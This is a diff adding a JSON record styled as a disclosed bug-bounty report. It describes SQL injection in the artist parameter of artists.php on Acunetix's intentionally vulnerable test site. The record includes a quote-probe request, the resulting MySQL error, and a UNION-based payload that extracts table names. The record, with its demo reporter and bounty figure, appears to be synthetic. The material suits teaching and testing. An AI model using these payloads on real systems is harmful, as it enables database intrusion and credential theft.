@@ -1,0 +1,14 @@
+{
+  "id": 800002,
+  "title": "SQL Injection in artists.php via artist Parameter on testphp.vulnweb.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "visibility": "full",
+  "team": {"handle": "acunetix-testphp", "name": "Acunetix Test PHP"},
+  "reporter": {"username": "resurface_demo"},
+  "weakness": {"id": 67, "name": "SQL Injection"},
+  "vulnerability_information": "## Summary\nThe `artist` parameter on `http://testphp.vulnweb.com/artists.php` is vulnerable to SQL Injection. The parameter value is passed directly into a SQL query without proper sanitization or parameterized queries.\n\n## Steps to Reproduce\n1. Navigate to `http://testphp.vulnweb.com/artists.php?artist=1`\n2. Append a single quote to the artist parameter: `http://testphp.vulnweb.com/artists.php?artist=1'`\n3. Observe the MySQL error in the response confirming SQL injection\n4. Use UNION-based injection to extract data:\n   ```\n   http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--\n   ```\n\n## Proof of Concept\n```http\nGET /artists.php?artist=1' HTTP/1.1\nHost: testphp.vulnweb.com\n```\n\nResponse contains:\n```\nError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1\n```\n\nThis confirms the parameter is directly concatenated into the SQL query.\n\n## Impact\n- Full database access — read all tables including user credentials\n- Potential to write files to the server\n- Possible Remote Code Execution via INTO OUTFILE or other MySQL features\n- Complete compromise of the application and its data",
+  "disclosed_at": "2025-06-15T12:00:00.000Z",
+  "bounty_amount": "3000.0"
+}
